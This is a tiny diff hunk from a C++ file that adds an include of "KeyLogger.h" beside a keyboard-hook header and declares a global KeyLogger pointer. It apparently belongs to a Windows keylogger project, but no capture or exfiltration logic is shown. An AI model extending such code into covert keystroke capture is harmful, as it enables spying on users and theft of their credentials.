@@ -5,6 +5,7 @@
 #include "HookKbd.h"
 #include <Windows.h>
 #include <iostream>
+#include "KeyLogger.h"
 
 using namespace std;
 KeyLogger* keyLogger = nullptr;
